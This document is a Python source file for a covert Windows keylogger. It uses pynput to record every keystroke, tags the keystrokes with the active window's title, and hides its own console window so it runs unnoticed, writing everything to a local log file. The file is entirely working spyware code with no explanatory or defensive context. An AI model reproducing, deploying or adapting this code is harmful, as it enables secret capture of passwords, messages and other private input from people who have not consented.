import os
import threading
import time
import ctypes
from pynput import keyboard

class KeyLogger:
    def __init__(self, log_file="key_log.txt"):
        self.log_file = log_file
        self.listener = None
        self.last_active_window = None

    def get_active_window_title(self):
        window_title = None
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            if hwnd != 0:
                buffer = ctypes.create_unicode_buffer(256)
                ctypes.windll.user32.GetWindowTextW(hwnd, buffer, ctypes.sizeof(buffer))
                window_title = buffer.value
        except Exception as e:
            print("Error getting active window title:", e)
        return window_title

    def on_press(self, key):
        try:
            with open(self.log_file, "a") as log:
                active_window_title = self.get_active_window_title()
                if active_window_title != self.last_active_window:
                    log.write(f"\n[Window: {active_window_title}]\n")
                    self.last_active_window = active_window_title
                log.write(f"{key.char}")
        except Exception as e:
            print("Error writing to log file:", e)

    def start(self):
        self.hide()
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        self.listener.join()

    def hide(self):
        try:
            self.window = ctypes.windll.kernel32.GetConsoleWindow()
            if self.window != 0:
                ctypes.windll.user32.ShowWindow(self.window, 0)
                ctypes.windll.kernel32.CloseHandle(self.window)
        except Exception as e:
            print("Error hiding console window:", e)

if __name__ == "__main__":
    log_directory = "logs"
    os.makedirs(log_directory, exist_ok=True)
    keylogger = KeyLogger(os.path.join(log_directory, "key_log.txt"))
    keylogger.start()
